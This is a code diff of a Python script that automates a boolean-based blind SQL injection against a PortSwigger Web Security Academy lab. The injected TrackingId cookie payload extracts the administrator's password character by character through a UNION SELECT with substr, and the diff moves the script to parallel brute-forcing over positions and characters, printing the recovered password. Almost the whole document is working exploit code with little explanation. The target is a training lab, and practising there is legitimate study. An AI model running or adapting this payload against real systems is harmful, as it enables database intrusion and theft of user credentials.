@@ -6,7 +6,7 @@ from lib import *
 req = FartRequest("""
 GET / HTTP/1.1
 Host: 0a86003f0392bc76c0139af8004000ed.web-security-academy.net
-Cookie: TrackingId='%20union%20select%20null%20from%20users%20where%20substr(password%2c{len("state")+1}%2c1)%20%3d%20'char'%20and%20username%3d'administrator'--
+Cookie: TrackingId='%20union%20select%20null%20from%20users%20where%20substr(password%2cbrute_index%2c1)%20%3d%20'char'%20and%20username%3d'administrator'--
 Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Windows"
@@ -28,11 +28,13 @@ Connection: close
 charset = string.ascii_lowercase + string.digits
 charset = [x for x in charset]
 
-worker = HttpWorker(req.substitute(char=charset))
-
 t = time.time()
-looper = FartLooper(worker, "") \
-    .get_first(lambda resp: "Welcome back!" in resp.text) \
-    .update_with(lambda resp, state: state + resp.payloads[0]) \
-    .loop()
+responses = HttpWorker(req.substitute(char=charset, brute_index=[str(x) for x in range(1, 21)])) \
+    .store_if(lambda resp: "Welcome back!" in resp.text) \
+    .run_wait()
+
+responses = sorted(responses, key=lambda resp: int(resp.payloads[1]))
+for x in responses:
+    print(x.payloads[0], end="")
+print()
 print(time.time() - t)
